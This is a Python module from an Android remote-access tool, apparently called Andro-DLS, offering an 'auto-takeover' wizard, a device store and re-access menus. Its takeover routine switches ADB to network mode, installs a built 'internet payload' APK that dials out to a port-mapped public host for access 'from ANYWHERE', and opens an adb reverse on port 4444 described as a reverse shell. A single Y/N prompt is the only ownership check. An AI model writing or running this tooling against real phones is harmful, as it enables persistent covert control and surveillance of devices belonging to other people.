"""Device Store + Takeover wizard (CLI 1/2/3) — the primary face of Andro-DLS.

Replaces the old manual "1 connect / 2 list / 3 scan" with an ownership-first
flow:
  1) AUTO-TAKEOVER — plug USB → tcpip → Wi-Fi IP → detect model → AUTHORIZE
     (only your own/selected phones) → auto-store → internet-first access
  2) MY DEVICES    — listed store: pick a phone (switch profiles), view status
  3) RE-ACCESS     — reconnect a stored/known phone over LAN/internet

All functions keep working for any adb-reachable device; the store remembers
serials/IPs so re-attach is one key. Authorization gate is front and center:
a device is only added after you confirm it is yours.
"""
from __future__ import annotations

import json
import re
import subprocess
import time
from pathlib import Path

from modules import remoteshell
from modules.config import AppConfig
from modules.console import (
    console,
    ask,
    confirm,
    print_error,
    print_success,
    print_warning,
)

ROOT = Path(__file__).resolve().parent.parent
STORE = ROOT / ".payload-build" / "devices.json"


# --------------------------------------------------------------------------
# Store (json)
# --------------------------------------------------------------------------

def load_store() -> list[dict]:
    try:
        return json.loads(STORE.read_text())
    except Exception:
        return []


def save_store(devs: list[dict]) -> None:
    STORE.parent.mkdir(parents=True, exist_ok=True)
    STORE.write_text(json.dumps(devs, indent=2))


def _adb(args: list[str], serial: str | None = None):
    cmd = ["adb"] + (["-s", serial] if serial else []) + args
    return subprocess.run(cmd, capture_output=True, text=True)


def device_info(serial: str) -> dict:
    """Model + wifi ip of a connected device (best effort)."""
    model = ""
    for prop in ("ro.product.marketname", "ro.product.model", "ro.build.product"):
        r = _adb(["shell", "getprop", prop], serial)
        v = (r.stdout or "").strip()
        if v and "unknown" not in v.lower():
            model = v
            break
    name = model or serial.split(":")[0]
    ip = ""
    if ":" in serial:
        ip = serial.split(":")[0]
    else:
        ip = remoteshell.read_wifi_ip(serial) or ""
    return {"name": name, "model": model, "serial": serial, "ip": ip}


def add_or_update(serial: str, authorized: bool = True) -> dict:
    info = device_info(serial)
    devs = load_store()
    for d in devs:
        if d.get("serial") == serial:
            d.update(info)
            d["authorized"] = authorized
            save_store_file(devs)
            return d
    dev = {**info, "authorized": authorized, "added": int(time.time())}
    devs.append(dev)
    save_store_file(devs)
    return dev


def save_store_file(devs) -> None:
    STORE.parent.mkdir(parents=True, exist_ok=True)
    STORE.write_text(json.dumps(devs, indent=2))


def authorize(serial: str) -> bool:
    """Ethical gate — user must confirm the device belongs to them (Y/N)."""
    if not confirm(
        f"[bold]Authorize[/bold] this device as YOUR OWN phone? (permission control 😊)\n"
        f"  {serial} — Remote takeover WILL be enabled for it. Y/N"
    ):
        print_warning("not authorized — nothing stored")
        return False
    add_or_update(serial, authorized=True)
    print_success(f"device stored + authorized ✓  ({serial})")
    return True


# --------------------------------------------------------------------------
# 1) AUTO-TAKEOVER
# --------------------------------------------------------------------------

def takeover_new(config: AppConfig) -> None:
    console.print("\n[bold cyan]▸ AUTO-TAKEOVER[/bold cyan]  new phone → authorize → store → access\n")

    # wait/use USB device (or any)
    serial = None
    for _ in range(10):
        serial = remoteshell.first_device(allowed_wifi=False) or remoteshell.first_device(allowed_wifi=True)
        if serial:
            break
        time.sleep(2)
    if not serial:
        print_error("no device — plug USB / enable wireless debugging, then choose 1 again")
        return

    # prime tcpip if USB
    if ":" not in serial:
        _adb(["tcpip", "5555"], serial)
        time.sleep(2)
        ip = remoteshell.read_wifi_ip(serial)
        if ip:
            _adb(["connect", f"{ip}:5555"])
            time.sleep(2)
            serial = f"{ip}:5555"

    info = device_info(serial)
    console.print(f"  [dim]detected:[/dim] [white]{info['name'] or info['serial']}[/white] ({serial})")
    if not info["serial"]:
        print_error("could not read device info")
        return

    # authorize gate
    if not authorize(serial):
        return
    print_success(f"device stored: {info['name']} @ {serial}")

    # internet-first: if portmap configured → open tunnel path now
    pm = remoteshell.loadportmap_config()
    if pm:
        print_warning("portmap configured — building internet payload for this phone…")
        try:
            from modules import pivot

            apk = remoteshell.build_fgs_payload(pm.get("dial_host", "127.0.0.1"), pm["public_port"])
            if apk:
                remoteshell.install_and_launch(serial, apk)
                print_success("internet payload installed — phone can connect from ANYWHERE")
            else:
                print_warning("payload build failed — use 64 Full Access later")
        except Exception as e:
            print_warning(f"internet setup issue: {e}")
    else:
        print("  [dim]no tunnel configured — run 66 (Portmap setup) for permanent internet access[/dim]")

    # quick local reverse shell as the "it works" moment
    _adb(["reverse", "tcp:4444", "tcp:4444"], serial)
    print("\n[bold]Takeover stored ✓[/bold]  use 2 (My Devices) to pick it, 3/67 to re-access anytime.")


# --------------------------------------------------------------------------
# 2) MY DEVICES
# --------------------------------------------------------------------------

def store_menu(config: AppConfig) -> None:
    console.print("\n[bold cyan]▸ MY DEVICES[/bold cyan]  stored authorized phones\n")
    devs = load_store()
    if not devs:
        print("[yellow]nothing stored yet — choose 1 (Auto-Takeover) to add your phone[/yellow]")
        return
    for i, d in enumerate(devs, 1):
        mark = "🔓" if d.get("authorized") else "🔒"
        console.print(
            f"  [white]{i}.[/white] {mark} [green]{d.get('name') or d.get('serial')}[/green]  "
            f"{d.get('serial','?')}  ip:{d.get('ip','?')}"
        )
    console.print("  [yellow]A)[/yellow] add by serial    [yellow]R)[/yellow] remove    [yellow]S)[/yellow] select / reconnect    [yellow]Q[/yellow] back")
    choice = ask("[prompt]> [/prompt]").strip().lower()
    if choice in ("q", ""):
        return
    if choice == "a":
        s = ask("[cyan]adb serial or ip:5555[/cyan]> ").strip()
        if s:
            if s.isdigit():
                print_error("that looks like a port — pass ip:5555 or USB serial")
            else:
                add_or_update(s, authorized=True)
                print_success(f"stored {s}")
    elif choice == "r":
        idx = _pick_idx(devs)
        if idx is not None:
            gone = devs.pop(idx)
            save_store_file(devs)
            print_warning(f"removed {gone.get('name','?')}")
    elif choice == "s":
        idx = _pick_idx(devs)
        if idx is not None:
            d = devs[idx]
            serial = d["serial"]
            if ":" in serial:
                _adb(["connect", serial])
            print_success(f"selected {d.get('name','?')} — run 3/67 to re-access")


def _pick_idx(devs) -> int | None:
    c = ask("[cyan]which device[/cyan]> ").strip()
    if c.isdigit() and 1 <= int(c) <= len(devs):
        return int(c) - 1
    print_error("invalid")
    return None


# --------------------------------------------------------------------------
# 3) RE-ACCESS A STORED DEVICE (alias of reaccess.reaccess but store-aware)
# --------------------------------------------------------------------------

def reaccess_saved(config: AppConfig) -> None:
    from modules import reaccess

    devs = load_store()
    if devs:
        console.print("[dim]stored devices — attaching first one…[/dim]")
        d = devs[0]
        serial = d["serial"]
        if ":" in serial:
            _adb(["connect", serial])
            print_success(f"connect {serial} …")
    reaccess.reaccess(config)